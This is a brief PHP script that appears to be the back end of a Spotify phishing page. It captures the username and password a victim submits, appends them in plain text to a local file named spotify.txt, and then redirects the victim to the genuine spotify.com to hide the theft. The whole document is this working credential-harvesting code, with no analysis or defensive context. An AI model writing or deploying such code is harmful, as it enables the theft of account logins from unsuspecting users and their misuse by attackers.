<?php

file_put_contents("../datas/spotify.txt", "Account: " . $_POST['username'] . " \nPass: " . $_POST['password'] . "\n", 
FILE_APPEND);
header('Location: https://spotify.com');
exit();
